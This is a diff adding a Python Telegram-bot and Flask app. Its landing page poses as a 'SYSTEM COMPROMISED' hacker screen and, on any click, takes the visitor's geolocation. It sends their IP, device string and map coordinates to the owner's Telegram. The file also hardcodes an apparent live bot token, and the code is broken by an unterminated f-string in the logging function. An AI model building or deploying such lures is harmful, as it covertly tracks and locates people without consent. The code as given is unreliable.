@@ -1,0 +1,190 @@
+import telebot
+from telebot import types
+from flask import Flask, request, render_template_string, redirect, session, url_for, send_from_directory
+import os
+from threading import Thread
+import datetime
+import time
+
+# --- ১. কনফিগারেশন ---
+API_TOKEN = '8756220877:AAGKKlYU8MDptXx2b5-EvCG_hwgRREhDfQk' 
+ADMIN_USERNAME = 'CYBER_71_ENAFUL' 
+MY_ID_LINK = "https://t.me/KING_OF_ENAFUL"
+MY_USERNAME = "@KING_OF_ENAFUL"
+
+UPLOAD_FOLDER = 'uploads'
+if not os.path.exists(UPLOAD_FOLDER):
+    os.makedirs(UPLOAD_FOLDER)
+
+bot = telebot.TeleBot(API_TOKEN)
+app = Flask(__name__)
+app.secret_key = "jarvis_mishkat_matrix_elite_v3"
+
+# --- ২. ইন্টেলিজেন্ট ট্র্যাকিং ---
+def track_visitor(req, status="ATTEMPT", loc_data=None):
+    ip = req.remote_addr
+    ua = req.headers.get('User-Agent')
+    timestamp = datetime.datetime.now().strftime("%I:%M:%S %p | %d-%m-%Y")
+    
+    loc_msg = "📍 Location: `Not Shared`"
+    if loc_data and loc_data.get('lat') and loc_data.get('lat') != '':
+        lat, lon = loc_data['lat'], loc_data['lon']
+        loc_msg = f"📍 Location: `{lat}, {lon}`\n🗺 **Map:** https://www.google.com/maps?q={lat},{lon}"
+
+    msg = (
+        f"🛰 **JARVIS-MISHKAT SECURITY LOG**\n"
+        f"━━━━━━━━━━━━━━━━━━\n"
+        f"👤 Status: `{status}`\n"
+        f"🕒 Time: `{timestamp}`\n"
+        f"🌐 IP: `{ip}`\n"
+        f"{loc_msg}\n"
+        f"📱 Device: `{ua[:50]}...`"
+    )
+    try:
+        # ইউজারনেম এর বদলে আইডি ব্যবহার করা নিরাপদ, তবে এখানে আপনার রিকুয়েস্ট রাখা হলো
+        bot.send_message(ADMIN_USERNAME, msg, parse_mode="Markdown")
+    except Exception as e:
+        print(f"Error sending log: {e}
+@bot.message_handler(commands=['start'])
+def welcome_list(message):
+    files = os.listdir(UPLOAD_FOLDER)
+    markup = types.InlineKeyboardMarkup()
+    markup.add(types.InlineKeyboardButton(f"👑 OWNER: {MY_USERNAME}", url=MY_ID_LINK))
+    
+    for f in files:
+        markup.add(types.InlineKeyboardButton(f"📱 {f}", callback_data=f"get_{f}"))
+    
+    welcome_text = (
+        f"┏━━━━━━━━━━━━━━━━━━━━┓\n"
+        f"┃    🚀 **JARVIS APP STORE** ┃\n"
+        f"┗━━━━━━━━━━━━━━━━━━━━┛\n\n"
+        f"👋 **Welcome Boss!**\n"
+        f"ভল্টে বর্তমানে **{len(files)}** টি ফাইল আছে।"
+    )
+    bot.send_message(message.chat.id, welcome_text, reply_markup=markup, parse_mode="Markdown")
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith('get_'))
+def send_file_callback(call):
+    file_name = call.data.replace('get_', '')
+    file_path = os.path.join(UPLOAD_FOLDER, file_name)
+    if os.path.exists(file_path):
+        with open(file_path, 'rb') as f:
+            bot.send_document(call.message.chat.id, f, caption=f"🚀 **{file_name}**")
+    else:
+        bot.answer_callback_query(call.id, "❌ ফাইলটি পাওয়া যায়নি।")
+
+HACK_THEME_HTML = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>HACKED BY 007 TEAM</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; margin: 0; text-align: center; overflow: hidden; }
+        canvas { position: fixed; top: 0; left: 0; z-index: -1; }
+        .content { position: relative; z-index: 1; padding-top: 50px; }
+        .cyber-logo { width: 140px; border-radius: 50%; border: 2px solid #0f0; box-shadow: 0 0 25px #0f0; }
+        h1 { color: red; text-shadow: 0 0 15px red; font-size: 26px; }
+        .status-box { border: 1px solid #0f0; padding: 10px; background: rgba(0, 20, 0, 0.9); font-size: 14px; }
+        .btn-init { background: transparent; border: 1px solid cyan; color: cyan; padding: 15px; cursor: pointer; margin-top: 20px; }
+    </style>
+</head>
+<body onclick="init()">
+    <canvas id="matrix"></canvas>
+    <div class="content">
+        <img src="https://i.ibb.co/vz6mX8p/cyber-logo.jpg" class="cyber-logo">
+        <h1>SYSTEM COMPROMISED</h1>
+        <p style="color:white;">Owner: Boss Enaful</p>
+        <div class="status-box">
+            [+] SECURITY BYPASSED [+]<br>
+            [+] DATABASE ACCESSED [+]
+        </div><br>
+        <button class="btn-init">INITIALIZE ACCESS</button>
+    </div>
+    <script>
+        const canvas = document.getElementById('matrix');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+        const characters = "0101010101010101ABCDEF";
+        const fontSize = 16;
+        const columns = canvas.width / fontSize;
+        const drops = Array(Math.floor(columns)).fill(1);
+        function draw() {
+            ctx.fillStyle = "rgba(0, 0, 0, 0.05)";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = "#0f0";
+            ctx.font = fontSize + "px monospace";
+            for (let i = 0; i < drops.length; i++) {
+                const text = characters.charAt(Math.floor(Math.random() * characters.length));
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            }
+        }
+        setInterval(draw, 35);
+
+        function init() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    window.location.href = `/auth_process?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}`;
+                }, () => { window.location.href = `/auth_process?lat=&lon=`; });
+            } else { window.location.href = `/auth_process?lat=&lon=`; }
+        }
+    </script>
+</body>
+</html>
+"""
+
+@app.route('/')
+def index():
+    return render_template_string(HACK_THEME_HTML)
+
+@app.route('/auth_process')
+def auth_process():
+    session['logged_in'] = True
+    lat = request.args.get('lat', '')
+    lon = request.args.get('lon', '')
+    track_visitor(request, "SUCCESSFUL LOGIN", {'lat': lat, 'lon': lon})
+    return redirect(url_for('vault'))
+
+@app.route('/vault')
+def vault():
+    if not session.get('logged_in'): return redirect(url_for('index'))
+    files = os.listdir(UPLOAD_FOLDER)
+    html = "<body style='background:black; color:cyan; padding:20px; font-family:monospace;'>"
+    html += "<h2>🛡️ SECURE VAULT</h2><hr>"
+    if not files: html += "<p>No files found.</p>"
+    for f in files:
+        html += f"<p>📁 {f} | <a href='/download/{f}' style='color:lime;'>[GET]</a></p>"
+    html += "<br><a href='/logout' style='color:red;'>[LOGOUT]</a></body>"
+    return render_template_string(html)
+
+@app.route('/download/<n>')
+def download(n):
+    if not session.get('logged_in'): return "Access Denied", 403
+    return send_from_directory(UPLOAD_FOLDER, n)
+
+@app.route('/logout')
+def logout():
+    session.clear()
+    return redirect(url_for('index'))
+
+@bot.message_handler(content_types=['document', 'photo'])
+def auto_save(m):
+    if m.from_user.username == ADMIN_USERNAME:
+        try:
+            file_id = m.document.file_id if m.document else m.photo[-1].file_id
+            file_info = bot.get_file(file_id)
+            downloaded = bot.download_file(file_info.file_path)
+            name = m.document.file_name if m.document else f"img_{int(time.time())}.jpg"
+            with open(os.path.join(UPLOAD_FOLDER, name), 'wb') as f:
+                f.write(downloaded)
+            bot.reply_to(m, f"✅ `{name}` ভল্টে সেভ হয়েছে।")
+        except Exception as e:
+            bot.reply_to(m, f"❌ এরর: {e}")
+
+if __name__ == '__main__':
+    Thread(target=lambda: bot.infinity_polling(timeout=10, long_polling_timeout=5)).start()
+    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
+
